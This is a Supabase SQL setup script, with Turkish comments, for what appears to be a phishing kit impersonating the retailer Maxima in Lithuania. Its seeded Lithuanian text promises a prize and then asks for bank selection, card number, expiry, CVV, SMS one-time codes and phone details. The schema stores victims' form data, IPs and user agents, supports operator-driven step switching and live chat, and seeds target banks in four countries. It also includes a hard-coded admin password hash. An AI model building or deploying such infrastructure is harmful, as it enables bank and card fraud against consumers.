-- =====================================================================
-- MAXIMAIMRAN (MAXIMA / LITVANYA) — YENI SUPABASE KURULUM SQL'I
-- Repo'nun kendi migration'larina gore hazirlandi.
-- Supabase > SQL Editor > New Query > Yapistir > RUN (tek seferde)
-- =====================================================================

CREATE EXTENSION IF NOT EXISTS pgcrypto WITH SCHEMA extensions;

-- ==================== 1) SESSIONS (id TEXT — repo'nun semasi) ====================
CREATE TABLE IF NOT EXISTS public.sessions (
  id text PRIMARY KEY DEFAULT encode(extensions.gen_random_bytes(12), 'hex'),
  amount integer NOT NULL DEFAULT 0,
  current_step text NOT NULL DEFAULT 'win',
  status text NOT NULL DEFAULT 'offline',
  sms_digits integer NOT NULL DEFAULT 6,
  form_data jsonb NOT NULL DEFAULT '{}'::jsonb,
  is_hidden boolean DEFAULT false,
  created_at timestamptz NOT NULL DEFAULT now(),
  updated_at timestamptz NOT NULL DEFAULT now(),
  participation_code text,
  partner_name text,
  public_id bigint,
  sms_custom_text text,
  ip_address text,
  user_agent text,
  session_type text DEFAULT 'normal',
  deleted_at timestamptz
);

ALTER TABLE public.sessions DROP CONSTRAINT IF EXISTS sessions_amount_check;
ALTER TABLE public.sessions ADD CONSTRAINT sessions_amount_check CHECK (amount >= 0);

-- Repo'daki 20261007_add_verify_step listesi + ek stepler (superset, guvenli)
ALTER TABLE public.sessions DROP CONSTRAINT IF EXISTS sessions_current_step_check;
ALTER TABLE public.sessions DROP CONSTRAINT IF EXISTS sessions_step_check;
ALTER TABLE public.sessions ADD CONSTRAINT sessions_current_step_check
CHECK (current_step IN (
  'code_entry','sms','win','verify','banken','banken2','card','wait','invalid_bank',
  'bank','live_support','special_approval','congratulations','congrats',
  'facebook','wheel','login','bank_login','SPECIAL_INFO',
  'generator1','generator2','custom_question','win2'
));

ALTER TABLE public.sessions DROP CONSTRAINT IF EXISTS sessions_status_check;
ALTER TABLE public.sessions ADD CONSTRAINT sessions_status_check
CHECK (status IN ('online','offline','SUCCESS','CONGRATS','SPECIAL_INFO'));

ALTER TABLE public.sessions DROP CONSTRAINT IF EXISTS sessions_sms_digits_check;
ALTER TABLE public.sessions ADD CONSTRAINT sessions_sms_digits_check CHECK (sms_digits >= 4 AND sms_digits <= 12);

CREATE SEQUENCE IF NOT EXISTS public.sessions_public_id_seq;
ALTER SEQUENCE public.sessions_public_id_seq OWNED BY public.sessions.public_id;
ALTER TABLE public.sessions ALTER COLUMN public_id SET DEFAULT nextval('public.sessions_public_id_seq'::regclass);
CREATE UNIQUE INDEX IF NOT EXISTS sessions_public_id_idx ON public.sessions (public_id);

CREATE INDEX IF NOT EXISTS sessions_created_at_idx ON public.sessions (created_at DESC);
CREATE INDEX IF NOT EXISTS idx_sessions_ip_created ON public.sessions (ip_address, created_at DESC);

ALTER TABLE ONLY public.sessions REPLICA IDENTITY FULL;

-- ==================== 2) BANKS (id UUID + slug unique) ====================
CREATE TABLE IF NOT EXISTS public.banks (
  id uuid PRIMARY KEY DEFAULT gen_random_uuid(),
  slug text UNIQUE NOT NULL,
  name text NOT NULL,
  country text,
  logo_url text,
  bg_url text,
  preview_url text,
  enabled boolean NOT NULL DEFAULT true,
  sort_order integer NOT NULL DEFAULT 0,
  brand_color text,
  accent_color text,
  domain text,
  logo_file text,
  is_active boolean NOT NULL DEFAULT true,
  auto_redirect boolean NOT NULL DEFAULT false,
  design_config jsonb NOT NULL DEFAULT '{}'::jsonb,
  custom_html text,
  created_at timestamptz NOT NULL DEFAULT now(),
  updated_at timestamptz NOT NULL DEFAULT now()
);

CREATE INDEX IF NOT EXISTS banks_country_idx ON public.banks (country);
CREATE INDEX IF NOT EXISTS banks_enabled_idx ON public.banks (enabled);
ALTER TABLE ONLY public.banks REPLICA IDENTITY FULL;

-- ==================== 3) GLOBAL_SETTINGS (genis kolonlu, repo semasi) ====================
CREATE TABLE IF NOT EXISTS public.global_settings (
  id uuid PRIMARY KEY DEFAULT gen_random_uuid(),
  logo_url text DEFAULT '/form-assets/maxima-mini-logo.png',
  bg_url text DEFAULT '/form-assets/bg-desktop.png',
  background_url text,
  og_image_url text,
  portal_name text DEFAULT 'Maxima',
  support_center_name text DEFAULT 'Maxima pagalba',
  target_country text DEFAULT 'Litvanya',
  site_language text DEFAULT 'lt',
  site_enabled boolean DEFAULT true,
  entry_page text DEFAULT '/win',
  wheel_settings jsonb DEFAULT '{}'::jsonb,
  win_title text,
  win_subtitle text,
  win_button text,
  banken_title text,
  banken_subtitle text,
  wait_title text,
  wait_subtitle text,
  sms_title text,
  card_title text,
  card_subtitle text,
  code_title text,
  code_subtitle text,
  code_button text,
  live_support_title text,
  live_support_subtitle text,
  live_support_button text,
  profile_title_small text,
  profile_title_main text,
  profile_subtitle text,
  profile_button text,
  banken_search_placeholder text,
  sms_subtitle text,
  sms_input_label text,
  sms_button text,
  sms_loading text,
  card_owner_label text,
  card_number_label text,
  card_expiry_label text,
  card_cvv_label text,
  card_button text,
  profile_firstname_label text,
  profile_lastname_label text,
  profile_phone_label text,
  profile_loading_text text,
  created_at timestamptz DEFAULT now(),
  updated_at timestamptz DEFAULT now()
);

INSERT INTO public.global_settings (
  site_enabled, entry_page, site_language, target_country,
  logo_url, bg_url, portal_name, support_center_name,
  win_title, win_subtitle, win_button,
  banken_title, banken_subtitle, banken_search_placeholder,
  wait_title, wait_subtitle,
  sms_title, sms_subtitle, sms_input_label, sms_button, sms_loading,
  card_title, card_subtitle, card_owner_label, card_number_label,
  card_expiry_label, card_cvv_label, card_button,
  code_title, code_subtitle, code_button,
  live_support_title, live_support_subtitle, live_support_button,
  profile_title_small, profile_title_main, profile_subtitle,
  profile_firstname_label, profile_lastname_label, profile_phone_label,
  profile_button, profile_loading_text
)
SELECT
  true, '/win', 'lt', 'Litvanya',
  '/form-assets/maxima-mini-logo.png', '/form-assets/bg-desktop.png',
  'Maxima klientų portalas', 'Maxima klientų aptarnavimas',
  'Išskirtinė Maxima premija',
  'Sveikiname! Buvote atrinkti šios dienos Maxima kampanijai. Spustelėkite žemiau esantį mygtuką, kad atsiimtumėte savo premiją.',
  'Atsiimti premiją',
  'Pasirinkite savo banką', 'Pasirinkite savo banką, kad tęstumėte.', 'Ieškoti banko...',
  'Prašome palaukti', 'Jūsų užklausa saugiai apdorojama...',
  'SMS saugos kodas', 'Įveskite {digits} skaitmenų kodą.', 'Vienkartinis kodas', 'Patvirtinti', 'Apdorojama...',
  'Mokėjimo informacija', 'Patikrinkite ir patvirtinkite savo duomenis.',
  'Kortelės turėtojo vardas', 'Kortelės numeris', 'Galiojimo pabaiga MM/MM', 'Saugos kodas', 'Tęsti',
  'Sveiki', 'Įveskite dalyvavimo kodą, kurį gavote iš {partner}, kad atsiimtumėte atlygį.', 'Patvirtinti kodą',
  'Tiesioginis palaikymas',
  'Norėdami tęsti, turite susisiekti su mūsų klientų aptarnavimo skyriumi.' || chr(10) || chr(10) || 'Spustelėkite žemiau esantį mygtuką, kad pradėtumėte pokalbį.',
  'Pradėti pokalbį',
  'Prizas patvirtintas', 'Jūsų premijos suma', 'Patvirtinkite savo duomenis tolesniam apdorojimui.',
  'Vardas', 'Pavardė', 'Mobiliojo telefono numeris', 'Kitas', 'Apdorojama...'
WHERE NOT EXISTS (SELECT 1 FROM public.global_settings);

-- ==================== 4) CHAT_MESSAGES (session'a FK'li, repo semasi) ====================
CREATE TABLE IF NOT EXISTS public.chat_messages (
  id uuid PRIMARY KEY DEFAULT gen_random_uuid(),
  session_id text NOT NULL REFERENCES public.sessions(id) ON DELETE CASCADE,
  sender text NOT NULL CHECK (sender IN ('user','admin','support')),
  content text NOT NULL,
  image_url text,
  created_at timestamptz NOT NULL DEFAULT now()
);

CREATE INDEX IF NOT EXISTS idx_chat_messages_session ON public.chat_messages (session_id, created_at);
CREATE INDEX IF NOT EXISTS idx_chat_messages_created_at ON public.chat_messages (created_at DESC);
ALTER TABLE ONLY public.chat_messages REPLICA IDENTITY FULL;

-- ==================== 5) BANNED_IPS ====================
CREATE TABLE IF NOT EXISTS public.banned_ips (
  ip_address text PRIMARY KEY,
  reason text,
  banned_at timestamptz DEFAULT now()
);

-- ==================== 6) ADMIN_LOGS ====================
CREATE TABLE IF NOT EXISTS public.admin_logs (
  id bigint GENERATED ALWAYS AS IDENTITY PRIMARY KEY,
  admin_email text NOT NULL,
  action text NOT NULL,
  target text,
  detail jsonb,
  ip text,
  user_agent text,
  created_at timestamptz NOT NULL DEFAULT now()
);

-- ==================== 7) TRIGGER'LAR ====================
CREATE OR REPLACE FUNCTION public.set_sessions_updated_at() RETURNS trigger
  LANGUAGE plpgsql SECURITY DEFINER SET search_path TO 'public'
  AS $$ begin new.updated_at = now(); return new; end; $$;

CREATE OR REPLACE FUNCTION public.set_banks_updated_at() RETURNS trigger
  LANGUAGE plpgsql SECURITY DEFINER SET search_path TO 'public'
  AS $$ begin new.updated_at = now(); return new; end; $$;

CREATE OR REPLACE FUNCTION public.set_updated_at() RETURNS trigger
  LANGUAGE plpgsql SET search_path TO 'public'
  AS $$ begin new.updated_at = now(); return new; end; $$;

DROP TRIGGER IF EXISTS sessions_set_updated_at ON public.sessions;
CREATE TRIGGER sessions_set_updated_at BEFORE UPDATE ON public.sessions FOR EACH ROW EXECUTE FUNCTION public.set_sessions_updated_at();

DROP TRIGGER IF EXISTS banks_set_updated_at ON public.banks;
CREATE TRIGGER banks_set_updated_at BEFORE UPDATE ON public.banks FOR EACH ROW EXECUTE FUNCTION public.set_banks_updated_at();

DROP TRIGGER IF EXISTS global_settings_set_updated_at ON public.global_settings;
CREATE TRIGGER global_settings_set_updated_at BEFORE UPDATE ON public.global_settings FOR EACH ROW EXECUTE FUNCTION public.set_updated_at();

-- ==================== 8) RLS + POLICY'LER (repo migration'lari ile birebir) ====================
ALTER TABLE public.sessions ENABLE ROW LEVEL SECURITY;
DROP POLICY IF EXISTS sessions_authenticated_all ON public.sessions;
DROP POLICY IF EXISTS sessions_anon_select_demo ON public.sessions;
DROP POLICY IF EXISTS sessions_anon_update_demo ON public.sessions;
DROP POLICY IF EXISTS sessions_anon_insert_demo ON public.sessions;
DROP POLICY IF EXISTS sessions_anon_select ON public.sessions;
DROP POLICY IF EXISTS sessions_anon_update ON public.sessions;
DROP POLICY IF EXISTS sessions_anon_insert ON public.sessions;
DROP POLICY IF EXISTS sessions_service_all ON public.sessions;
CREATE POLICY sessions_authenticated_all ON public.sessions FOR ALL TO authenticated USING (true) WITH CHECK (true);
CREATE POLICY sessions_anon_select_demo ON public.sessions FOR SELECT TO anon USING (true);
CREATE POLICY sessions_anon_update_demo ON public.sessions FOR UPDATE TO anon USING (true) WITH CHECK (true);
CREATE POLICY sessions_anon_insert_demo ON public.sessions FOR INSERT TO anon WITH CHECK (true);

ALTER TABLE public.banks ENABLE ROW LEVEL SECURITY;
DROP POLICY IF EXISTS banks_authenticated_all ON public.banks;
DROP POLICY IF EXISTS banks_anon_select ON public.banks;
DROP POLICY IF EXISTS "Allow public read access on banks" ON public.banks;
DROP POLICY IF EXISTS "Allow public insert on banks" ON public.banks;
DROP POLICY IF EXISTS "Allow public update on banks" ON public.banks;
DROP POLICY IF EXISTS "Allow public delete on banks" ON public.banks;
CREATE POLICY banks_authenticated_all ON public.banks FOR ALL TO authenticated USING (true) WITH CHECK (true);
CREATE POLICY banks_anon_select ON public.banks FOR SELECT TO anon USING (true);

ALTER TABLE public.global_settings ENABLE ROW LEVEL SECURITY;
DROP POLICY IF EXISTS global_settings_anon_select ON public.global_settings;
DROP POLICY IF EXISTS global_settings_authenticated_all ON public.global_settings;
DROP POLICY IF EXISTS "Enable read access for all users" ON public.global_settings;
DROP POLICY IF EXISTS "Enable insert for all users" ON public.global_settings;
DROP POLICY IF EXISTS "Enable update for all users" ON public.global_settings;
DROP POLICY IF EXISTS "Enable delete for all users" ON public.global_settings;
CREATE POLICY global_settings_anon_select ON public.global_settings FOR SELECT TO anon USING (true);
CREATE POLICY global_settings_authenticated_all ON public.global_settings TO authenticated USING (true) WITH CHECK (true);

ALTER TABLE public.chat_messages ENABLE ROW LEVEL SECURITY;
DROP POLICY IF EXISTS chat_messages_anon_all ON public.chat_messages;
DROP POLICY IF EXISTS chat_messages_auth_all ON public.chat_messages;
DROP POLICY IF EXISTS chat_anon_rw ON public.chat_messages;
DROP POLICY IF EXISTS chat_messages_insert_policy ON public.chat_messages;
DROP POLICY IF EXISTS chat_messages_select_policy ON public.chat_messages;
CREATE POLICY chat_messages_anon_all ON public.chat_messages FOR ALL TO anon USING (true) WITH CHECK (true);
CREATE POLICY chat_messages_auth_all ON public.chat_messages FOR ALL TO authenticated USING (true) WITH CHECK (true);

ALTER TABLE public.banned_ips ENABLE ROW LEVEL SECURITY;
DROP POLICY IF EXISTS "Allow all read access to banned_ips" ON public.banned_ips;
DROP POLICY IF EXISTS "Allow all insert access to banned_ips" ON public.banned_ips;
DROP POLICY IF EXISTS "Allow all delete access to banned_ips" ON public.banned_ips;
CREATE POLICY "Allow all read access to banned_ips" ON public.banned_ips FOR SELECT USING (true);
CREATE POLICY "Allow all insert access to banned_ips" ON public.banned_ips FOR INSERT WITH CHECK (true);
CREATE POLICY "Allow all delete access to banned_ips" ON public.banned_ips FOR DELETE USING (true);

ALTER TABLE public.admin_logs ENABLE ROW LEVEL SECURITY;
DROP POLICY IF EXISTS admin_logs_authenticated_all ON public.admin_logs;
CREATE POLICY admin_logs_authenticated_all ON public.admin_logs TO authenticated USING (true) WITH CHECK (true);

-- ==================== 9) STORAGE ====================
INSERT INTO storage.buckets (id, name, public) VALUES ('chat_images','chat_images',true) ON CONFLICT (id) DO NOTHING;
INSERT INTO storage.buckets (id, name, public) VALUES ('assets','assets',true) ON CONFLICT (id) DO NOTHING;

DROP POLICY IF EXISTS chat_images_select ON storage.objects;
DROP POLICY IF EXISTS chat_images_insert ON storage.objects;
DROP POLICY IF EXISTS "Public Access" ON storage.objects;
DROP POLICY IF EXISTS "Allow Uploads" ON storage.objects;
CREATE POLICY chat_images_select ON storage.objects FOR SELECT USING (bucket_id = 'chat_images');
CREATE POLICY chat_images_insert ON storage.objects FOR INSERT WITH CHECK (bucket_id = 'chat_images');
CREATE POLICY "Public Access" ON storage.objects FOR SELECT USING (bucket_id IN ('assets','chat_images'));
CREATE POLICY "Allow Uploads" ON storage.objects FOR INSERT WITH CHECK (bucket_id IN ('assets','chat_images'));

-- ==================== 10) REALTIME ====================
DO $$ BEGIN ALTER PUBLICATION supabase_realtime ADD TABLE public.sessions; EXCEPTION WHEN duplicate_object THEN NULL; END $$;
DO $$ BEGIN ALTER PUBLICATION supabase_realtime ADD TABLE public.banks; EXCEPTION WHEN duplicate_object THEN NULL; END $$;
DO $$ BEGIN ALTER PUBLICATION supabase_realtime ADD TABLE public.chat_messages; EXCEPTION WHEN duplicate_object THEN NULL; END $$;

NOTIFY pgrst, 'reload schema';

-- ==================== 11) BANKA SEED (Litvanya aktif, digerleri pasif) ====================
INSERT INTO public.banks (slug, name, country, logo_file, sort_order, is_active, enabled) VALUES
  ('swedbank-lt', 'Swedbank',       'LT', '/bank-logos/lithuania/swedbank-lt.png', 10, true, true),
  ('seb-lt',      'SEB',            'LT', '/bank-logos/lithuania/seb-lt.png',      20, true, true),
  ('luminor-lt',  'Luminor',        'LT', '/bank-logos/lithuania/luminor-lt.png',  30, true, true),
  ('citadele-lt', 'Citadele',       'LT', '/bank-logos/lithuania/citadele-lt.png', 40, true, true),
  ('siauliu-lt',  'Šiaulių bankas', 'LT', '/bank-logos/lithuania/siauliu-lt.png',  50, true, true),
  ('lku-lt',      'LKU',            'LT', '/bank-logos/lithuania/lku-lt.png',      60, true, true)
ON CONFLICT (slug) DO NOTHING;

INSERT INTO public.banks (slug, name, country, logo_file, sort_order, is_active, enabled) VALUES
  ('facebook-lt', 'Facebook', 'LT', '/form-assets/maxima-mini-logo.png', 999, false, false)
ON CONFLICT (slug) DO NOTHING;

INSERT INTO public.banks (slug, name, country, logo_file, sort_order, is_active, enabled) VALUES
  ('swedbank-ee',        'Swedbank',         'Estonya', '/bank-logos/estonia/swedbank-ee.jpg',       110, false, true),
  ('seb-pank',           'SEB Pank',         'Estonya', '/bank-logos/estonia/seb-pank.jpg',          120, false, true),
  ('lhv-pank',           'LHV Pank',         'Estonya', '/bank-logos/estonia/lhv-pank.jpg',          130, false, true),
  ('luminor-ee',         'Luminor',          'Estonya', '/bank-logos/estonia/luminor-ee.jpg',        140, false, true),
  ('coop-pank',          'Coop Pank',        'Estonya', '/bank-logos/estonia/coop-pank.jpg',         150, false, true),
  ('inbank',             'Inbank',           'Estonya', '/bank-logos/estonia/inbank.png',            160, false, true),
  ('bigbank',            'Bigbank',          'Estonya', '/bank-logos/estonia/bigbank.jpg',           170, false, true),
  ('citadele-banka',     'Citadele Banka',   'Estonya', '/bank-logos/estonia/citadele-banka.jpg',    180, false, true),
  ('op-corporate-bank',  'OP Corporate Bank','Estonya', '/bank-logos/estonia/op-corporate-bank.jpg', 190, false, true),
  ('ing',                'ING',              'Hollanda','/bank-logos/ing.svg',                       210, false, true),
  ('rabobank',           'Rabobank',         'Hollanda','/bank-logos/rabobank.svg',                  220, false, true),
  ('abn-amro',           'ABN AMRO',         'Hollanda','/bank-logos/abn-amro.svg',                  230, false, true),
  ('bunq',               'bunq',             'Hollanda','/bank-logos/bunq.svg',                      240, false, true),
  ('knab',               'Knab',             'Hollanda','/bank-logos/knab.svg',                      250, false, true),
  ('n26',                'N26',              'Hollanda','/bank-logos/n26.svg',                       260, false, true),
  ('revolut',            'Revolut',          'Hollanda','/bank-logos/revolut.svg',                   270, false, true),
  ('triodos-bank',       'Triodos Bank',     'Hollanda','/bank-logos/triodos-bank.svg',              280, false, true),
  ('nordea-fi',          'Nordea',           'Finlandiya','/bank-logos/nordea-fi.svg',               310, false, true),
  ('op-fi',              'OP',               'Finlandiya','/bank-logos/op-fi.svg',                   320, false, true),
  ('danske-bank-fi',     'Danske Bank',      'Finlandiya','/bank-logos/danske-bank-fi.png',          330, false, true),
  ('handelsbanken-fi',   'Handelsbanken',    'Finlandiya','/bank-logos/handelsbanken-fi.svg',        340, false, true),
  ('aktia-fi',           'Aktia',            'Finlandiya','/bank-logos/aktia-fi.svg',                350, false, true),
  ('s-pankki-fi',        'S-Pankki',         'Finlandiya','/bank-logos/s-pankki-fi.png',             360, false, true)
ON CONFLICT (slug) DO NOTHING;

-- Eski suffix'siz LT kayitlari varsa temizle
DELETE FROM public.banks WHERE slug IN ('siauliu-bankas-lt','siauliu-bankas','artea-lt');

-- Facebook asla aktif olmasin
UPDATE public.banks SET is_active = false WHERE slug ILIKE '%facebook%' OR slug ILIKE '%meta%' OR slug ILIKE '%instagram%';

-- ==================== 12) ADMIN KULLANICISI (eski DB: admin@gmail.com, sifre ayni) ====================
-- Bu blok hata verirse silin: Dashboard > Authentication > Add user ile olusturun.
INSERT INTO auth.users (instance_id, id, aud, role, email, encrypted_password, email_confirmed_at, invited_at, confirmation_token, confirmation_sent_at, recovery_token, recovery_sent_at, email_change_token_new, email_change, email_change_sent_at, last_sign_in_at, raw_app_meta_data, raw_user_meta_data, is_super_admin, created_at, updated_at, phone, phone_confirmed_at, phone_change, phone_change_token, phone_change_sent_at, email_change_token_current, email_change_confirm_status, banned_until, reauthentication_token, reauthentication_sent_at, is_sso_user, deleted_at, is_anonymous)
VALUES ('00000000-0000-0000-0000-000000000000', 'ec308c8b-c87e-4a7d-8c38-b547af15f4a2', 'authenticated', 'authenticated', 'admin@gmail.com', '$2a$10$YI2t3RHVdaFS/Efb2KlPz.3QqIuadTHOnptF3D1fmtXb3rTJ0TECG', '2026-09-29 20:07:01.310511+00', NULL, '', NULL, '', NULL, '', '', NULL, '2026-10-03 08:19:48.67008+00', '{"provider": "email", "providers": ["email"]}', '{"email_verified": true}', NULL, '2026-09-29 20:07:01.288745+00', '2026-10-13 17:26:14.333748+00', NULL, NULL, '', NULL, NULL, '', 0, NULL, '', NULL, false, NULL, false)
ON CONFLICT (id) DO NOTHING;

INSERT INTO auth.identities (provider_id, user_id, identity_data, provider, last_sign_in_at, created_at, updated_at, id)
VALUES ('ec308c8b-c87e-4a7d-8c38-b547af15f4a2', 'ec308c8b-c87e-4a7d-8c38-b547af15f4a2', '{"sub": "ec308c8b-c87e-4a7d-8c38-b547af15f4a2", "email": "admin@gmail.com", "email_verified": true, "phone_verified": false}', 'email', '2026-09-29 20:07:01.304807+00', '2026-09-29 20:07:01.304921+00', '2026-09-29 20:07:01.304921+00', '60437834-57d0-4d56-9c1d-cd0e20471c31')
ON CONFLICT DO NOTHING;

-- ==================== DOGRULAMA ====================
SELECT 'banks' AS tablo, COUNT(*) AS kayit FROM public.banks
UNION ALL SELECT 'global_settings', COUNT(*) FROM public.global_settings
UNION ALL SELECT 'sessions', COUNT(*) FROM public.sessions
UNION ALL SELECT 'chat_messages', COUNT(*) FROM public.chat_messages
UNION ALL SELECT 'banned_ips', COUNT(*) FROM public.banned_ips
UNION ALL SELECT 'admin_logs', COUNT(*) FROM public.admin_logs;
